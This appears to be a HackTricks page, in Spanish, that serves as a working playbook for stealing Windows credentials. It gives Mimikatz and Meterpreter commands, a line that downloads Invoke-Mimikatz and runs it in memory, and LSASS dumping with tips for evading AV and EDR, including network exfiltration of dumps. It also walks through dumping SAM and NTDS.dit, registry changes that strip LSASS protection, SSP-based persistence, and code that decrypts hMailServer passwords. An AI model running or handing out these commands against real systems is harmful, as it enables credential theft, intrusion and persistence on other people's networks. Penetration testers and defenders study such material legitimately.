# Robo de credenciales de Windows

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encuentra otras cosas que Mimikatz puede hacer en** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Aprende sobre algunas posibles protecciones de credenciales aquí.**](credentials-protections.md) **Estas protecciones podrían impedir que Mimikatz extraiga algunas credenciales.**

## Credentials con Meterpreter

Usa el [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** he creado para **buscar contraseñas y hashes** dentro de la víctima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Evasión de AV

### Procdump + Mimikatz

Como **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**es una herramienta legítima de Microsoft**, no es detectado por Defender.\
Puedes usar esta herramienta para **dump el proceso lsass**, **download el dump** y **extract** las **credentials localmente** del dump.

También puedes usar [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Este proceso se realiza automáticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Algunos **AV** pueden **detectar** como **malicioso** el uso de **procdump.exe para volcar lsass.exe**, esto es porque están **detectando** la cadena **"procdump.exe" y "lsass.exe"**. Por eso es más **sigiloso** **pasar** como **argumento** el **PID** de lsass.exe a procdump **en lugar de** el **nombre lsass.exe.**

### Volcando lsass con **comsvcs.dll**

Una DLL llamada **comsvcs.dll** ubicada en `C:\Windows\System32` es responsable de **volcar la memoria del proceso** en caso de un bloqueo. Esta DLL incluye una **función** llamada **`MiniDumpW`**, diseñada para ser invocada usando `rundll32.exe`.\
Es irrelevante usar los dos primeros argumentos, pero el tercero se divide en tres componentes. El ID del proceso a volcar constituye el primer componente, la ubicación del archivo de volcado representa el segundo, y el tercer componente es estrictamente la palabra **full**. No existen opciones alternativas.\
Al analizar estos tres componentes, la DLL procede a crear el archivo de volcado y a volcar en él la memoria del proceso especificado.\
La utilización de **comsvcs.dll** es factible para volcar el proceso lsass, eliminando así la necesidad de subir y ejecutar procdump. Este método se describe en detalle en [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

El siguiente comando se emplea para la ejecución:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puedes automatizar este proceso con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Volcado de lsass con Task Manager**

1. Haga clic derecho en la Task Bar y seleccione Task Manager
2. Haga clic en More details
3. Busque el proceso "Local Security Authority Process" en la pestaña Processes
4. Haga clic derecho sobre el proceso "Local Security Authority Process" y haga clic en "Create dump file".

### Volcado de lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) es un binario firmado por Microsoft que forma parte de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Volcado de lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) es una herramienta Protected Process Dumper Tool que soporta ofuscar volcados de memoria y transferirlos a estaciones de trabajo remotas sin escribirlos en el disco.

**Funcionalidades clave**:

1. Evadir la protección PPL
2. Ofuscar volcados de memoria para evadir los mecanismos de detección basados en firmas de Defender
3. Subir volcados de memoria usando los métodos RAW y SMB sin escribirlos en disco (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon incluye un dumper de tres etapas llamado **LalsDumper** que nunca llama a `MiniDumpWriteDump`, por lo que los hooks de EDR sobre esa API nunca se activan:

1. **Etapa 1 — loader (`lals.exe`)** – busca en `fdp.dll` un placeholder formado por 32 caracteres `d` en minúscula, lo sobrescribe con la ruta absoluta a `rtu.txt`, guarda el DLL parcheado como `nfdp.dll` y llama a `AddSecurityPackageA("nfdp","fdp")`. Esto fuerza a **LSASS** a cargar el DLL malicioso como un nuevo Security Support Provider (SSP).
2. **Etapa 2 dentro de LSASS** – cuando LSASS carga `nfdp.dll`, el DLL lee `rtu.txt`, XORea cada byte con `0x20` y mapea el blob decodificado en memoria antes de transferir la ejecución.
3. **Etapa 3 — dumper** – el payload mapeado re-implementa la lógica de MiniDump usando **direct syscalls** resueltas desde nombres de API hasheados (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Una exportación dedicada llamada `Tom` abre `%TEMP%\<pid>.ddt`, vuelca en streaming un dump comprimido de LSASS al archivo y cierra el handle para que la exfiltración pueda ocurrir después.

Notas para el operador:

* Mantén `lals.exe`, `fdp.dll`, `nfdp.dll` y `rtu.txt` en el mismo directorio. Etapa 1 reescribe el placeholder hard-coded con la ruta absoluta a `rtu.txt`, así que separarlos rompe la cadena.
* El registro ocurre añadiendo `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Puedes establecer ese valor tú mismo para hacer que LSASS recargue el SSP en cada arranque.
* Los archivos `%TEMP%\*.ddt` son dumps comprimidos. Descomprímelos localmente y luego pásalos a Mimikatz/Volatility para extraer credenciales.
* Ejecutar `lals.exe` requiere derechos admin/SeTcb para que `AddSecurityPackageA` tenga éxito; una vez que la llamada regresa, LSASS carga transparentemente el SSP malicioso y ejecuta la Etapa 2.
* Eliminar el DLL del disco no lo expulsa de LSASS. O bien elimina la entrada del registro y reinicia LSASS (reboot) o déjalo para persistencia a largo plazo.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Volcar el NTDS.dit desde el DC objetivo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Volcar el historial de contraseñas de NTDS.dit desde el DC objetivo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostrar el atributo pwdLastSet para cada cuenta de NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Estos archivos deberían estar **ubicados** en _C:\windows\system32\config\SAM_ y _C:\windows\system32\config\SYSTEM._ Pero **no puedes simplemente copiarlos de forma regular** porque están protegidos.

### Desde el Registro

La forma más sencilla de robar esos archivos es obtener una copia desde el registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Descarga** esos archivos en tu máquina Kali y **extrae los hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Puedes realizar copias de archivos protegidos usando este servicio. Necesitas ser Administrador.

#### Using vssadmin

El binario vssadmin solo está disponible en las versiones de Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Pero puedes hacer lo mismo desde **Powershell**. Este es un ejemplo de **cómo copiar el archivo SAM** (la unidad usada es "C:" y se guarda en C:\users\Public) pero puedes usar esto para copiar cualquier archivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Código del libro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Finalmente, también podrías usar el [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciales de Active Directory - NTDS.dit**

El archivo **NTDS.dit** es conocido como el corazón de **Active Directory**, y contiene datos cruciales sobre objetos de usuario, grupos y sus membresías. Es donde se almacenan los **password hashes** de los usuarios del dominio. Este archivo es una base de datos **Extensible Storage Engine (ESE)** y reside en **_%SystemRoom%/NTDS/ntds.dit_**.

Dentro de esta base de datos se mantienen tres tablas principales:

- **Data Table**: Se encarga de almacenar detalles sobre objetos como usuarios y grupos.
- **Link Table**: Registra las relaciones, como las membresías de grupo.
- **SD Table**: Aquí se almacenan los **descriptores de seguridad** de cada objeto, asegurando la seguridad y el control de acceso de los objetos almacenados.

Más información al respecto: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows usa _Ntdsa.dll_ para interactuar con ese archivo y es usado por _lsass.exe_. Entonces, **parte** del archivo **NTDS.dit** podría estar ubicada **dentro de la memoria `lsass`** (puedes encontrar los datos accedidos más recientemente, probablemente debido a la mejora de rendimiento por el uso de una **cache**).

#### Descifrado de los hashes dentro de NTDS.dit

El hash está cifrado 3 veces:

1. Descifrar la Password Encryption Key (**PEK**) usando la **BOOTKEY** y **RC4**.
2. Descifrar el **hash** usando **PEK** y **RC4**.
3. Descifrar el **hash** usando **DES**.

**PEK** tiene el **mismo valor** en **cada controlador de dominio**, pero está **cifrado** dentro del archivo **NTDS.dit** usando la **BOOTKEY** del archivo **SYSTEM** del controlador de dominio (es diferente entre controladores de dominio). Por eso, para obtener las credenciales del archivo NTDS.dit **necesitas los archivos NTDS.dit y SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiando NTDS.dit usando Ntdsutil

Disponible desde Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
También puedes usar el [**volume shadow copy**](#stealing-sam-and-system) truco para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del **SYSTEM** (otra vez, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) truco).

### **Extrayendo hashes de NTDS.dit**

Una vez que hayas **obtenido** los archivos **NTDS.dit** y **SYSTEM**, puedes usar herramientas como _secretsdump.py_ para **extract the hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
También puedes **extraerlos automáticamente** usando un usuario domain admin válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para **archivos NTDS.dit grandes** se recomienda extraerlos usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, también puedes usar el **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Extracción de objetos de dominio desde NTDS.dit a una base de datos SQLite**

Los objetos NTDS se pueden extraer a una base de datos SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). No solo se extraen secretos, sino también los objetos completos y sus atributos para obtener información adicional cuando el archivo NTDS.dit sin procesar ya ha sido recuperado.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
La colmena `SYSTEM` es opcional pero permite el descifrado de secretos (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Junto con otra información, se extraen los siguientes datos: cuentas de usuario y de equipo con sus hashes, UAC flags, marcas de tiempo del último inicio de sesión y del cambio de contraseña, descripción de las cuentas, nombres, UPN, SPN, grupos y membresías recursivas, árbol y pertenencia de unidades organizativas, dominios de confianza con trusts type, dirección y atributos...

## Lazagne

Descarga el binario desde [here](https://github.com/AlessandroZ/LaZagne/releases). Puedes usar este binario para extraer credenciales de varios software.
```
lazagne.exe all
```
## Otras herramientas para extraer credenciales de SAM y LSASS

### Windows credentials Editor (WCE)

Esta herramienta puede usarse para extraer credenciales de la memoria. Descárgala desde: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrae credenciales del archivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraer credenciales del SAM file
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Descárgalo desde:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) y simplemente **ejecútalo** y las contraseñas serán extraídas.

## Minado de sesiones RDP inactivas y debilitamiento de controles de seguridad

El FinalDraft RAT de Ink Dragon incluye un tasker `DumpRDPHistory` cuyas técnicas son útiles para cualquier red-teamer:

### Recolección de telemetría estilo DumpRDPHistory

* **Outbound RDP targets** – analiza cada user hive en `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Cada subclave almacena el nombre del servidor, `UsernameHint`, y la marca de tiempo de la última escritura. Puedes replicar la lógica de FinalDraft con PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – consulta el registro `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` para los Event IDs **21** (inicio de sesión exitoso) y **25** (desconexión) para mapear quién administró la máquina:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Una vez que sepas qué Domain Admin se conecta regularmente, volca LSASS (con LalsDumper/Mimikatz) mientras su sesión **disconnected** aún exista. CredSSP + NTLM fallback deja su verificador y tokens en LSASS, que luego pueden ser reproducidos por SMB/WinRM para extraer `NTDS.dit` o preparar persistencia en domain controllers.

### Registry downgrades targeted by FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Establecer `DisableRestrictedAdmin=1` fuerza la reutilización completa de credenciales/tickets durante RDP, habilitando pivotes al estilo pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` deshabilita el filtrado de tokens de UAC, de modo que los administradores locales obtienen tokens sin restricciones a través de la red.
* `DSRMAdminLogonBehavior=2` permite al administrador DSRM iniciar sesión mientras el DC está en línea, dando a los atacantes otra cuenta integrada de alto privilegio.
* `RunAsPPL=0` elimina las protecciones PPL de LSASS, haciendo trivial el acceso a memoria para dumpers como LalsDumper.

## Credenciales de la base de datos de hMailServer (post-compromise)

hMailServer almacena la contraseña de la base de datos en `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` bajo `[Database] Password=`. El valor está cifrado con Blowfish usando la clave estática `THIS_KEY_IS_NOT_SECRET` y swaps de endianness de palabras de 4 bytes. Usa la cadena hex del INI con este fragmento de Python:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Con la contraseña en texto claro, copie la base de datos de SQL CE para evitar bloqueos de archivos, cargue el proveedor de 32 bits y actualice si es necesario antes de consultar los hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
La columna `accountpassword` utiliza el formato de hash de hMailServer (hashcat mode `1421`). El cracking de estos valores puede proporcionar credenciales reutilizables para pivotes WinRM/SSH.
## Referencias

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
